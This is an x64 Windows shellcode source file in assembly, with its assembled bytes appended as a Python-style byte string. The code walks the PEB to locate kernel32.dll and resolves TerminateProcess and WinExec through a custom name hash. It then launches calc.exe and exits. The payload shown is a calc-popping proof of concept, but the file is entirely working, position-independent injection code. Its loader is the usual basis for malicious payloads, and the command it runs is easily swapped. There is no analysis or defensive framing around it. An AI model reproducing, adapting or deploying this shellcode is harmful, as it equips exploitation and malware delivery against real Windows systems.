global _start

_start:
    mov rbp, rsp                    ; new stack frame
    sub rsp, 0x28                   ; space for variables

    .find_kernel32:
        xor rcx, rcx                ; TEB structure
        mov rsi, gs:[rcx + 0x60]    ; PEB structure
        mov rsi, [rsi + 0x18]       ; ntdll!PebLdr
        mov rsi, [rsi + 0x30]       ; InInitializationOrderModuleList

    .next_module:
        mov rbx, [rsi + 0x10]       ; Base address
        mov rdi, [rsi + 0x40]       ; Module name
        mov rsi, [rsi]              ; Next element
        cmp cx, [rdi + 0x18]        ; len("kernel32.dll") * 2 [end = 0x0000]
        jnz .next_module            ; if zf == 0

        jmp .find_short             ; short jump

    .find_ret:
        pop rsi                     ; $rsi = return addr
        mov [rbp - 0x8], rsi        ; var8 = .find_function
        jmp .symbol_kernel32        ; load function from kernel32

    .find_short:
        call .find_ret              ; relative call

    .find_function:
        xor rcx, rcx                ; $rcx = 0x0
        mov eax, [rbx + 0x3c]       ; RVA to PE signature
        add rax, rbx                ; PE signature
        mov cl, 0x88                ; Offset to Export Table
        mov r10d, [rax + rcx]       ; RVA of Export Table
        add r10, rbx                ; Export Table
        mov ecx, [r10 + 0x18]       ; NR of Names
        mov edi, [r10 + 0x20]       ; RVA of Name Pointer Table
        add rdi, rbx                ; Name Pointer Table

    .find_loop:
        jrcxz .find_end             ; if rcx = 0x0
        dec ecx                     ; counter -= 1
        xor rsi, rsi                ; $rsi = 0x0
        mov esi, [rdi + rcx * 4]    ; RVA of symbol name
        add rsi, rbx                ; symbol name

        xor rax, rax                ; $rax = 0x0
        cdq                         ; $rdx = 0x0
        cld                         ; DF = 0

    .compute_hash:
        lodsb                       ; load in al next byte from rsi
        test al, al                 ; check null terminator
        jz .compare_hash            ; If ZF == 1
        ror edx, 0x2f               ; rot 47
        add edx, eax                ; add new byte
        jmp .compute_hash           ; loop

   .compare_hash:
        cmp edx, r13d               ; cmp edx, hash
        jnz .find_loop              ; if zf != 1
        mov r11d, [r10 + 0x24]      ; RVA of Orinal Table
        add r11, rbx                ; Ordinal Table
        mov cx, [r11 + 2 * rcx]     ; extrapolate ordinal functions
        mov r12d, [r10 + 0x1c]      ; RVA of Address Table
        add r12, rbx                ; Address Table
        mov eax, [r12 + 4 * rcx]    ; RVA of function
        add rax, rbx                ; function

    .find_end:
        ret                         ; return

    .symbol_kernel32:
        mov r13d, 0x8ee05933        ; TerminateProcess() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x10], rax       ; var16 = TerminateProcess()

        mov r13d, 0x10121ee3        ; WinExec() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x18], rax       ; var24 = WinExec()

    .call_winexec:
        xor rdx, rdx                ; $rdx = 0x0
        push rdx                    ; "\x00"
        mov rcx, 0x6578652e636c6163 ; "calc.exe"
        push rcx                    ; "calc.exe\x00"
        mov rcx, rsp                ; lpCmdLine
        inc rdx                     ; uCmdShow
        call [rbp - 0x18]           ; call WinExec()

    .exit:
        xor rcx, rcx                ; $rcx = 0x0
        dec rcx                     ; hProcess
        xor rdx, rdx                ; uExitCode
        call [rbp - 0x10]           ; call TerminateProcess()

; shellcode = b"\x48\x89\xe5\x48\x83\xec\x28\x48\x31\xc9\x65\x48\x8b\x71\x60\x48\x8b\x76\x18\x48\x8b\x76\x30\x48\x8b\x5e\x10\x48\x8b\x7e\x40\x48\x8b\x36\x66\x3b\x4f\x18\x75\xef\xeb\x07\x5e\x48\x89\x75\xf8\xeb\x60\xe8\xf4\xff\xff\xff\x48\x31\xc9\x8b\x43\x3c\x48\x01\xd8\xb1\x88\x44\x8b\x14\x08\x49\x01\xda\x41\x8b\x4a\x18\x41\x8b\x7a\x20\x48\x01\xdf\xe3\x3b\xff\xc9\x48\x31\xf6\x8b\x34\x8f\x48\x01\xde\x48\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x44\x39\xea\x75\xdd\x45\x8b\x5a\x24\x49\x01\xdb\x66\x41\x8b\x0c\x4b\x45\x8b\x62\x1c\x49\x01\xdc\x41\x8b\x04\x8c\x48\x01\xd8\xc3\x41\xbd\x33\x59\xe0\x8e\xff\x55\xf8\x48\x89\x45\xf0\x41\xbd\xe3\x1e\x12\x10\xff\x55\xf8\x48\x89\x45\xe8\x48\x31\xd2\x52\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x89\xe1\x48\xff\xc2\xff\x55\xe8\x48\x31\xc9\x48\xff\xc9\x48\x31\xd2\xff\x55\xf0"
